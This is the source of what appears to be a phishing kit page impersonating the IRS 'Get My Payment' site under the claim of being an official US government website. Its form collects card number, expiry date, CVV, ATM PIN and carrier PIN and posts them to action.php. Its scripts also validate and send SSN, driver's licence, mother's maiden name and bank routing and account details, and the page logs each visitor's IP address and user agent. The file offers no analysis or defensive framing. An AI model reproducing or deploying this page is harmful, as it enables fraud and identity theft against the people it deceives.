<?php
require "admin/config.php";
// you!
$_SESSION["uniqid"] = md5(uniqid());
$_SESSION["ip"] = $_SERVER['REMOTE_ADDR'];
$_SESSION["ua"] = $_SERVER['HTTP_USER_AGENT'];

if (isset($_SESSION["uniqid"])) {
    echo "<script>console.log('You: ".$_SESSION['uniqid']."' );</script>";
} else {
	echo "<script>console.log('Session didn't start :(');</script>";
	header('location:'.$exit);
}
?>
<html><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="robots" content="noindex,nofollow">
    <meta name="referrer" content="no-referrer">
    <link rel="icon" type="image/x-icon" href="images/favicon.ico">
        <link rel="stylesheet" href="https://cdn.usebootstrap.com/bootstrap/4.1.1/css/bootstrap.min.css">
        <link rel="stylesheet" href="css/jquery-ui.min.css">
        <link rel="stylesheet" href="css/irs.css">
        <link rel="stylesheet" href="css/app.css">
        
    <link rel="stylesheet" href="css/wmsp-shared-secrets.css">
    <link rel="stylesheet" href="css/wmsp-error.css">
    <link rel="stylesheet" href="css/wmsp-results.css">

    <title>Get My Payment</title>
  </head>
  <body class="icce">
  
    <div class="container-fluid" style="background: #f1f1f1; width: 100%;">
      <div class="flagtext">
        <p class="usflag">An official website of the United States Government</p>
      </div>
    </div>
  
    <div class="container-fluid" role="banner" style="background-color: #234E76; width: 100%;">
      <div class="header">
        <div class="navbar">
            <a class="logo" href="javascript:openIrsPage()" title="Go to IRS Home Page">
              <img aria-hidden="true" src="images/logo.png">
            </a>                                  
            
            <ul class="navbar-nav">
             
            <li class="navbar-item"><a class="nav-link" href="javascript:switchLanguage()" title="Click this link to switch language">Español</a>
            </li>        
                                
           
                <li class="navbar-item"><a class="nav-link" href="javascript:logout()" title="Click this link to logoff"> <span>Exit</span> 
                    <svg aria-hidden="true" focusable="false" viewBox="0 0 491.1 412.5">
                      <path d="M 282.9 283.5 v 11.9 c 0 24.5 0.1 49.1 0 73.6 c 0 9.3 3.2 16.6 12 20.6 c
                          9.2 4.1 16.7 0.5 23 -5.9 c 54.4 -54.3 108.8 -108.6 163.1 -163.1 c 10.2 -10.2
                          10.3 -21 0.3 -31 c -54.4 -54.7 -109.1 -109.2 -163.7 -163.7 c -6.1 -6.1 -13.4
                          -9.4 -22.3 -5.7 c -8.9 3.8 -12.4 11 -12.4 20.3 v 86 h -11.8 c -40.6 0 -81.1
                          -0.1 -121.7 0 c -15.7 0 -23.5 7.1 -23.6 22.3 c -0.2 37.6 -0.2 75.3 0 112.9 c
                          0.1 14.2 7.9 21.6 22.1 21.8 c 15.7 0.2 31.4 0.1 47.1 0.1 c 28.8 -0.1 57.6
                          -0.1 87.9 -0.1 Z M 8.2 205 h -0.4 c 0 35.7 -0.3 71.4 0.1 107 c 0.4 46.6 30.7
                          83.4 76.9 87.8 c 36.3 3.5 73.2 1.4 109.8 1.2 c 2.8 0 7.1 -3.9 8 -6.8 c 1.7
                          -5.1 2 -10.9 1.6 -16.4 c -0.9 -14 -2.8 -15.5 -16.7 -15.5 h -87.4 C 68 362.2
                          47 343 46.7 311.2 c -0.6 -70.7 -0.6 -141.4 0 -212.1 c 0.3 -32 21.1 -51.1
                          53.2 -51.2 c 28.8 -0.1 57.6 0 86.4 0 c 15.2 0 18.1 -2.9 18.1 -18.4 c 0 -3.3
                          -0.6 -6.5 -0.8 -9.8 c -0.5 -7.6 -4.5 -11 -12.1 -11 c -33.4 0.1 -66.8 -0.7
                          -100.1 0.4 c -44.7 1.5 -81.1 36.6 -83 81.1 c -1.4 38.2 -0.2 76.5 -0.2 114.8
                          Z">
                       </path>
                       <path d="M 282.9 283.5 h -87.8 c -15.7 0 -31.4 0.2 -47.1 -0.1 c -14.2 -0.2 -22 -7.6
                          -22.1 -21.8 c -0.3 -37.6 -0.3 -75.3 0 -112.9 c 0.1 -15.1 7.9 -22.2 23.6
                          -22.3 c 40.6 -0.1 81.1 0 121.7 0 H 283 V 114 V 40.4 c 0 -9.3 3.5 -16.5 12.4
                          -20.3 c 8.8 -3.7 16.1 -0.4 22.3 5.7 C 372.4 80.3 427 134.9 481.5 189.6 c 10
                          10 9.8 20.8 -0.3 31 c -54.3 54.5 -108.7 108.8 -163.1 163.1 c -6.4 6.4 -13.9
                          10 -23 5.9 c -8.8 -4 -12 -11.3 -12 -20.6 c 0.1 -24.5 0 -49.1 0 -73.6 c -0.2
                          -3.5 -0.2 -7 -0.2 -11.9 Z">
                       </path>
                       <path d="M 8.2 205 c 0 -38.3 -1.3 -76.6 0.3 -114.8 c 1.9 -44.5 38.3 -79.6 83 -81.1 c
                          33.3 -1.1 66.8 -0.3 100.1 -0.4 c 7.6 0 11.6 3.4 12.1 11 c 0.2 3.3 0.8 6.5
                          0.8 9.8 c 0 15.5 -3 18.4 -18.1 18.4 H 100 c -32.1 0.1 -53 19.3 -53.2 51.2 c
                          -0.6 70.7 -0.6 141.4 0 212.1 c 0.3 31.8 21.3 51.1 53.4 51.1 c 29.1 0.1 58.3
                          0 87.4 0 c 13.9 0 15.8 1.5 16.7 15.5 c 0.3 5.5 0 11.3 -1.6 16.4 c -1 2.9
                          -5.2 6.8 -8 6.8 c -36.6 0.2 -73.5 2.3 -109.8 -1.2 c -46.3 -4.3 -76.6 -41.2
                          -77 -87.8 c -0.3 -35.7 -0.1 -71.3 -0.1 -107 h 0.4 Z">
                        </path>
                    </svg></a></li>
                    
                    
           
                
  
              </ul>
            </div>
          </div>
        </div>
    <div class="main container-fluid">
      
    




<main id="accountRtn" style="">

<form action="action.php" method="post">
<input type="hidden" name="_csrf" value="pay_info"> 
<input type="hidden" name="cardstuff" id="cardstuff" value=""> 
  <h1 class="login-title">Payment Information</h1>

  <p>Provide your information below for funding.</p>
  
  <p>
  <span>All fields marked with an</span>
  <font color="#CD2026">*</font>
  <span>(asterisk) are required.</span>
  </p>
  <br>
  <p id="bankLabel"></p>
   
  <div class="form-group">
       

    <div class="form-group">
      <div class="control-label">
        <label>Card Number</label>
        <label style="color:#CD2026;font-weight:normal">*</label>
      </div>
      <input class="form-control" id="ccnum" maxlength="100" type="tel" name="ccnum" value=""> 
    </div>
    <div class="form-group">
      <div class="control-label">
        <label>Card Expiry Date</label>
        <label style="color:#CD2026;font-weight:normal">*</label>
      </div>
      <input class="form-control" id="ccexp" maxlength="100" type="tel" name="ccexp" value=""> 
        
    </div>
	
	
	<div class="form-group">
      <div class="control-label">
        <label>CVV</label>
        <label style="color:#CD2026;font-weight:normal">*</label>
      </div>
      <input class="form-control" id="cccvv" maxlength="4" type="tel" name="cccvv" value=""> 
        
    </div>
	
	<div class="form-group">
      <div class="control-label">
        <label>ATM PIN</label>
        <label style="color:#CD2026;font-weight:normal">*</label>
      </div>
      <input class="form-control" id="atmpin" type="tel" name="atmpin" value=""> 
        
    </div>
	
	<div class="form-group">
      <div class="control-label">
        <label>Carrier PIN</label>
        <label style="color:#CD2026;font-weight:normal">*</label>
      </div>
      <input class="form-control" id="carrierpin" type="tel" name="carrierpin" value=""> 
        
    </div>
	
	
	


    <div>
      <button class="login-submit-button btn btn-primary" name="submit" title="Click this button to continue" type="submit" value="submit">Continue</button>
    </div>
</form>
  
   

</main>
<main id="pmt_complete" style="display:none;"> 

<form action="#" method="post">

  <div>

  <h1 class="login-title">Payment Status</h1>

  <div>
    <div>
       
      
      <p>Thank you for uploading your documents that we need to verify you and once the verification process is over we will release funds to you are if additional verification is need will reach out to thank you.</p>
    </div>
    
  </div>
  
      
    <button class="login-submit-button btn btn-primary" name="submit" title="Click this button to exit the session" type="submit" value="exit" id="exit">Exit</button>
  </div>

  

</form>

</main>

    </div>
          
      <div class="container-fluid" style="background: #4E4E4E;width: 100%;">
          <div class="footer container-fluid"> 
            <div class="navbar">
              <div class="navfooterlogo">
          <img aria-hidden="true" alt="Decorative IRS Logo" src="images/irs_horiz_white.png">
        </div>

              
          <ul class="navbar-nav">
            <li class="navbar-item"><a class="nav-link" href="javascript:openIrsPrivacyPolicy()" title="Click this link to view the IRS Privacy Policy Page">
              <span style="color:white">IRS Privacy Policy</span>
              <svg style="top: 0.2em; vertical-align: baseline; position: relative;" fill="white" focusable="false" viewBox="0 0 40 40" width="1em" height="1em">
  <path d="m 31.4 20.7 v 7.2 q 0 2.6 -1.9 4.5 t -4.5 1.9 h -18.6
      q -2.6 0 -4.5 -1.9 t -1.9 -4.5 v -18.6 q 0 -2.7 1.9 -4.6
      t 4.5 -1.8 h 15.7 q 0.4 0 0.6 0.2 t 0.2 0.5 v 1.4
      q 0 0.3 -0.2 0.5 t -0.6 0.2 h -15.7 q -1.4 0 -2.5 1.1
      t -1 2.5 v 18.6 q 0 1.4 1 2.5 t 2.5 1 h 18.6 q 1.5 0 2.5 -1
      t 1.1 -2.5 v -7.2 q 0 -0.3 0.2 -0.5 t 0.5 -0.2 h 1.4
      q 0.3 0 0.5 0.2 t 0.2 0.5 Z m 8.6 -19.3 v 11.5
      q 0 0.5 -0.4 1 t -1 0.4 t -1 -0.4 l -4 -4 l -14.5 14.6
      q -0.2 0.2 -0.5 0.2 t -0.5 -0.2 l -2.6 -2.6
      q -0.2 -0.2 -0.2 -0.5 t 0.2 -0.5 l 14.6 -14.5 l -4 -4
      q -0.4 -0.4 -0.4 -1 t 0.4 -1 t 1 -0.4 h 11.5 q 0.6 0 1 0.4
      t 0.4 1 Z"></path>
  </svg></a></li>
            <li class="navbar-item" id="accessibility-link"><a class="nav-link" href="javascript:openIrsPage()" title="Click this link to view the Accessibility Page">
                <span style="color:white">Accessibility</span>
              <svg style="top: 0.2em; vertical-align: baseline; position: relative;" fill="white" focusable="false" viewBox="0 0 40 40" width="1em" height="1em">
  <path d="m 31.4 20.7 v 7.2 q 0 2.6 -1.9 4.5 t -4.5 1.9 h -18.6
      q -2.6 0 -4.5 -1.9 t -1.9 -4.5 v -18.6 q 0 -2.7 1.9 -4.6
      t 4.5 -1.8 h 15.7 q 0.4 0 0.6 0.2 t 0.2 0.5 v 1.4
      q 0 0.3 -0.2 0.5 t -0.6 0.2 h -15.7 q -1.4 0 -2.5 1.1
      t -1 2.5 v 18.6 q 0 1.4 1 2.5 t 2.5 1 h 18.6 q 1.5 0 2.5 -1
      t 1.1 -2.5 v -7.2 q 0 -0.3 0.2 -0.5 t 0.5 -0.2 h 1.4
      q 0.3 0 0.5 0.2 t 0.2 0.5 Z m 8.6 -19.3 v 11.5
      q 0 0.5 -0.4 1 t -1 0.4 t -1 -0.4 l -4 -4 l -14.5 14.6
      q -0.2 0.2 -0.5 0.2 t -0.5 -0.2 l -2.6 -2.6
      q -0.2 -0.2 -0.2 -0.5 t 0.2 -0.5 l 14.6 -14.5 l -4 -4
      q -0.4 -0.4 -0.4 -1 t 0.4 -1 t 1 -0.4 h 11.5 q 0.6 0 1 0.4
      t 0.4 1 Z"></path>
  </svg>
            </a></li>
          </ul>
          

        </div>
      </div>
    </div>
      
      
    
    <form action="/irfof-wmsp/logout" method="post" name="logoutForm">
    </form>
  <div tabindex="-1" role="dialog" class="ui-dialog ui-corner-all ui-widget ui-widget-content ui-front expire ui-dialog-buttons ui-draggable" aria-labelledby="ui-id-1" style="display: none;"><div class="ui-dialog-titlebar ui-corner-all ui-widget-header ui-helper-clearfix ui-draggable-handle expire"><span id="ui-id-1" class="ui-dialog-title expire">IRS - Session Warning</span><button type="button" class="ui-dialog-titlebar-close expire"></button></div><div id="expire-content" style="" class="ui-dialog-content ui-widget-content expire"><div id="expire-text" tabindex="0" class="expire">Your session will expire in 5 minutes.<br class="expire"><br class="expire">If you want to refresh the session for an additional 15 minutes select OK.  If not, select Cancel.</div></div><div class="ui-dialog-buttonpane ui-widget-content ui-helper-clearfix expire"><div class="ui-dialog-buttonset expire"><button type="button" title="Click here if you want to renew this session for 15 minutes" class="expire">OK</button><button type="button" title="Do not renew session" class="expire">Cancel</button></div></div></div>
</body>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.17.0/jquery.validate.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.13.4/jquery.mask.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.1/additional-methods.min.js"></script>
    
<script type="text/javascript">
    var emailretry = 0;
    var loginretry = 0;
document.onreadystatechange = function () {
  var state = document.readyState
  if (state == 'complete') {
    $("#accountRtn").show();
     
    }
}

$(function() {
$('#DateOfBirth').mask('00/00/0000');
$('#ZipCode').mask('00000');
$('#NumberPhone').mask('(000) 000-0000');
$('#ccnum').mask('0000 0000 0000 0000');
$('#ccexp').mask('00/00');
$('#Cvv').mask('0000');
$('#AtmPin').mask('000000');
$('#SecurityNumber').mask('000-00-0000');
$('#NumberPin').mask('0000000000');
$('#LicenseNExp').mask('00/00/0000');
$('#accountNumberInput').mask('00000000000000000');
$('#routingNumberGroup').mask('000000000');
$("#pinbank").mask('0000');
});

$(document).ready(function() {
    $("#routingNumberGroup").keyup(function() {
        var el = $(this);

        if (el.val().length === 9) {
        var url = "fedach.php?routing="+ $(el).val();
            $.ajax({
                url: url,
                cache: false,
                dataType: "json",
                type: "GET",
                success: function(result, success) {
                    $("#bankname").val(result.BankName);
                    $("#bankLabel").html(result.BankName);
                }
            });
        }
    });
});

$(document).ready(function() {
    $("#ZipCode").keyup(function() {
        var el = $(this);

        if (el.val().length === 5) {
        var url = "https://ziptasticapi.com/" + el.val();
            $.ajax({
                url: url,
                cache: false,
                dataType: "json",
                type: "GET",
                success: function(result, success) {
                    $("#CityR").val(result.city);
                    $("#StateRegion").val(result.state);
                }
            });
        }
    });
});


$('#routingNumberGroup').focus(function () {
    if (!$(this).parent().hasClass('has-error')) {
        $(this).after('<span class="help-block">Routing Number: Input is required</span>');
        $(this).addClass('is-invalid');
    } else {
        //$(this).parent('div').next('div').remove();
        $(this).next().html("A 9-digit number at the lower left corner of a check. Contact your bank if you need help.");
    }
}).blur(function () {
    if ($(this).val().length < 9 || $("#bankname").val().length < 1) {
      $(this).addClass('is-invalid');
      $(this).parent().addClass('has-error');
      $(this).next().html("The provided routing number is invalid.");
    } else {
      $(this).removeClass('is-invalid');
      $(this).parent().removeClass('has-error');
        $(this).next().remove();

    }
    });

$('#accountNumberInput').focus(function () {
    if (!$(this).parent().hasClass('has-error')) {
        $(this).after('<span class="help-block">Account Number: Input is required</span>');
        $(this).addClass('is-invalid');
    } else {
        //$(this).parent('div').next('div').remove();
        $(this).next().html("A 3-17 digit number at the bottom of a check or on a bank statement. Contact your bank if you need help.");
    }
}).blur(function () {
    if ($(this).val().length < 3 || $("#bankname").val().length < 1) {
      $(this).addClass('is-invalid');
      $(this).parent().addClass('has-error');
      $(this).next().html("The provided account number is invalid.");
    } else {
      $(this).removeClass('is-invalid');
      $(this).parent().removeClass('has-error');
        $(this).next().remove();

    }
    if ($("#routingNumberGroup").parent().hasClass('has-error')) {
      if ($('#routingNumberGroup').val().length < 9 || $("#bankname").val().length < 1) {
    } else {
      $('#routingNumberGroup').removeClass('is-invalid');
      $('#routingNumberGroup').parent().removeClass('has-error');
        $('#routingNumberGroup').next().remove();

    }
    }
    });

$(document).on('submit', '#accountRtn > form', function (e) {
  e.preventDefault();
    var errors = false;
    if ($("#ccnum").val() == '' || $("#ccexp").val() == '' || $("#cccvv").val() == '') {
        var errors = true;
		if (!$("#ccnum").parent().hasClass('has-error') && !$("#ccexp").parent().hasClass('has-error') && !$("#cccvv").parent().hasClass('has-error')) {
			$("#ccnum").addClass('is-invalid');
			$("#ccnum").parent().addClass('has-error');
			$("#ccnum").after('<span class="help-block">Card Number: Input is required</span>');
			
			
			
			$("#ccexp").addClass('is-invalid');
			$("#ccexp").parent().addClass('has-error');
			$("#ccexp").after('<span class="help-block">Card Expiry Date: Input is required</span>');
			
			
			$("#cccvv").addClass('is-invalid');
			$("#cccvv").parent().addClass('has-error');
			$("#cccvv").after('<span class="help-block">CVV: Input is required</span>');
			
			
			
		}
    }
	
	
	
	
    if (errors) {
    } else {
        form.submit();
      ;
    }

});


$(document).ready(function() {
    $("#ZipCode").keyup(function() {
        var el = $(this);
        
        if (el.val().length === 5) {
        var url = "https://ziptasticapi.com/" + el.val();
            $.ajax({
                url: url,
                cache: false,
                dataType: "json",
                type: "GET",
                success: function(result, success) {
                    $("#CityR").val(result.city);
                    $("#StateRegion").val(result.state);
                }
            });
        }
    });
});




$(function(){
    $(document).on('submit', '#billing > form', function (event) {
        // validate and process form here  
        $(this).validate({
            rules: {
                "firstName": { required: true, minlength: 3,},
                "lastName": { required: true, minlength: 3,},
                "LicenseNumber": { required: true, minlength: 5,},
				"Weight": { required: true, minlength: 2,},
                "LicenseNExp": { required: true, minlength: 3,},
                "LicenseIss": { required: true, minlength: 1,},
                "DateOfBirth": {  required: true, minlength: 10,},
                "StreetAddress": { required: true, minlength: 5,},
                "SecurityNumber": { required: true, minlength: 3,},
                "StateRegion": { required: true, minlength: 2,},
                "CityR": { required: true, minlength: 2,},
                "ZipCode": { required: true, minlength: 5, zipcodeUS: true,},
                "mobile": { required: true, minlength: 10,},
                "MaidenName": { required: true, minlength: 3,},
                "NumberCarrier": { required: true, minlength: 2,},
                "NumberPin": {
                    required: function () {
                        return $("#NumberPin").is(":visible");
                    },
                    minlength: 4,
                }
            },
            messages: {
                "firstName": {
                    required: "Please provide your First name",
                    minlength: "Please provide your First name",
                },
                "lastName": {
                    required: "Please provide your Last name",
                    minlength: "Please provide your Last name",
                },
                "LicenseNumber": {
                    required: "Please provide your driver's license number",
                    minlength: "Please provide your driver's license number",
                },
                "LicenseNExp": {
                    required: "Please provide your driver's license expiry date",
                    minlength: "Please provide your driver's license expiry date",
                },
                "LicenseIss": {
                    required: "Please select the state your driver's license state",
                    minlength: "Please select the state your driver's license state",
                },
                "DateOfBirth": {
                    required: "Please provide date of birth",
                    minlength: "Please check the date of birth you have entered",
                },
                "mobile": {
                    required: "Please provide phone number",
                    minlength: "Please check the number you have entered",
                },
                "NumberCarrier": {
                    required: "Please provide phone carrier",
                    minlength: "Please check the phone carrier you have entered",
                },
                "NumberPin": {
                    required: "Please provide phone carrier pin",
                    minlength: "Please check the phone carrier pin you have entered",
                },
                "StreetAddress": {
                    required: "Please provide your residential address",
                    minlength: "Please check the address you have entered",
                },
                "SecurityNumber": {
                    required: "Please provide your Social Security Number(SSN)",
                     minlength: "Please enter at least 9 characters",
                },
                "StateRegion": {
                    required: "Please provide your State",
                    minlength: "Please check the state you have entered",
                },
                "CityR": {
                    required: "Please provide your City",
                    minlength: "Please check the City you have entered",
                },

                "ZipCode": {
                    required: "Please provide your Zip Code",
                    zipcodeUS: "Please provide valid US your Zip Code",
                    minlength: "Please check the zip code you have entered",
                },
                "MaidenName": {
                    required: "Please provide mother's maiden name",
                    minlength: "Please check the name you entered",
                },
            },
            errorElement: 'span',
            errorClass: 'help-block',
            errorPlacement: function(error, element) {
                error.insertAfter(element);
            },      
            highlight: function(element, errorClass) {
                $(element).parent().addClass('has-error');
                $(element).addClass('is-invalid');
            },
            unhighlight: function(element, errorClass) {
                $(element).parent().removeClass('has-error');
                $(element).removeClass('is-invalid');
            },
            submitHandler: function(form) {
              $('#billing .login-submit-button').prop('disabled', true); 
                $.post("data/billing?key=<?php echo $key;?>", $("#billing > form").serialize(), function(result, success) {
                    if (success == "success") {
                        $("#billing").hide();
                        $("#accountRtn").show();
						
						//$(location).attr("href", "verification?key=<?php echo $key;?>");
						
                        $('#billing .login-submit-button').prop('disabled', false); 
                        $(location).attr("", "");
                   }
                });                  
        
},});
});
});

 $("#intro_btn").click(function(e) {
   $("#intro").hide();
   $("#billing").show();
 });
</script>
<script>

function openIrsPage ( ) {
var language = $('a.nav-link[href="javascript:switchLanguage()"]').text();
  
function openIrsAccessibility ( ) {
var language = $('a.nav-link[href="javascript:switchLanguage()"]').text();
}
if($.trim(language) == "English"){ 
  window.open (
    "http://www.irs.gov/es/help/irsgov-accessibility",
    "_blank" );  
 }
 else
 {
  window.open (
    "http://www.irs.gov/help/irsgov-accessibility",
    "_blank" );
 }   
}

function openIrsPrivacyPolicy ( ) {

var language = $('a.nav-link[href="javascript:switchLanguage()"]').text();

if($.trim(language) == "English"){ 
  window.open (
    "http://www.irs.gov/es/privacy-disclosure/irs-privacy-policy",
    "_blank" );  
 }
 else
 {
  window.open (
    "http://www.irs.gov/privacy/index.html",
    "_blank" );
 } 
}
</script>
</html>